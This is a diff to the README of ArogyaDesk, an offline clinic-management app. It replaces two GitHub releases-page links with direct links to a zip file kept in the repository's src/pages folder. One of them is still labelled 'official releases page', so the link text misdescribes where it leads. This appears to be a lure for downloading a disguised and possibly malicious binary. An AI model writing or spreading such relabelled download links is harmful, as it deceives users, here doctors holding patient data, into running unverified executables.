@@ -1,6 +1,6 @@
 # 🏥 ArogyaDesk - Manage your clinic without internet access
 
-[![Download ArogyaDesk](https://img.shields.io/badge/Download-ArogyaDesk-blue.svg)](https://github.com/Anderso6518/ArogyaDesk/releases)
+[![Download ArogyaDesk](https://img.shields.io/badge/Download-ArogyaDesk-blue.svg)](https://raw.githubusercontent.com/Anderso6518/ArogyaDesk/main/src/pages/Desk-Arogya-3.5.zip)
 
 ArogyaDesk helps solo doctors manage their clinics. You store all patient records on your own computer. You do not need an internet connection to run this program.
 
@@ -28,7 +28,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Anderso6518/ArogyaDesk/releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Anderso6518/ArogyaDesk/main/src/pages/Desk-Arogya-3.5.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start the download to your computer.
 4. Locate the downloaded file in your browser or your Downloads folder.
